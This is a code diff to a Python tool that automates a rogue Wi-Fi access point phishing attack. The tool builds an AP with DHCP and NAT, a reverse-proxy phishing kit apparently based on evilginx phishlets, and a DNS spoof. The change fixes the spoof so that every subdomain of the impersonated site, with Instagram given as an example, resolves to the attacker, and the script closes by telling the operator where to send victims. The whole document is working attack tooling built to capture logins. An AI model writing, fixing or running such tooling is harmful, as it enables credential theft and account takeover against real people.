@@ -160,13 +160,21 @@ def write_hosts(domain_puny, subs):
     return ordered
 
 
-def write_pulp(interface, interface_net, ssid, domain_puny, lure_url):
+def write_pulp(interface, interface_net, ssid, domain_puny, subs, lure_url):
     """The wp3 script: AP, DHCP class B, phishkin3 proxy, DNS spoof.
 
     interface_net is the adapter with internet (wlan0 usually). phishkin3 needs
     the victim to reach the outside after logging in -- and evilginx, if it is
     proxying a real site, needs to reach it too -- so wp3 shares that connection
     with NAT.
+
+    subs are the phishlet's proxy_hosts subdomains (e.g. ['www','m'] for
+    Instagram). They have to be listed one by one in the DNS spoof: the wildcard
+    entry '*.<domain>' is written to the zone file but the pydns server does
+    *not* match it against a real query like www.<domain> -- the log gives
+    'no local zone found, proxying www.<domain>' and the browser then gets
+    ERR_NAME_NOT_RESOLVED for the lure. Every landing hostname has to be added
+    explicitly, which is exactly what the phishkin3 tutorial's example does.
     """
     lines = [
         "set interface %s" % interface,
@@ -183,8 +191,20 @@ def write_pulp(interface, interface_net, ssid, domain_puny, lure_url):
         "set phishkin3.redirect_url_after_login https://google.com",
         "set phishkin3.allow_user_login_endpoint /verify",
         "use spoof.dns_spoof",
-        "add %s" % domain_puny,
-        "add *.%s" % domain_puny,
+    ]
+    # Every subdomain the phishlet lands on, plus the bare domain. The wildcard
+    # goes in too as a safety net for other lookups that share the zone file --
+    # it does not help the specific queries the browser makes, which is why the
+    # explicit list is what matters.
+    hostnames = [domain_puny] + ["%s.%s" % (s, domain_puny) for s in subs]
+    seen = set()
+    for h in hostnames:
+        if h in seen:
+            continue
+        seen.add(h)
+        lines.append("add %s" % h)
+    lines.append("add *.%s" % domain_puny)
+    lines += [
         "set redirectTo %s" % AP_IP,
         "start",
         "back",
@@ -286,7 +306,7 @@ def main():
 
     write_hosts(domain_puny, subs)
     write_pulp(args.interface, args.interface_net, args.ssid,
-               domain_puny, lure_url)
+               domain_puny, subs, lure_url)
     start_in_tmux(args.interface)
     say("")
     say("attack running. Send victims to: %s" % lure_url)
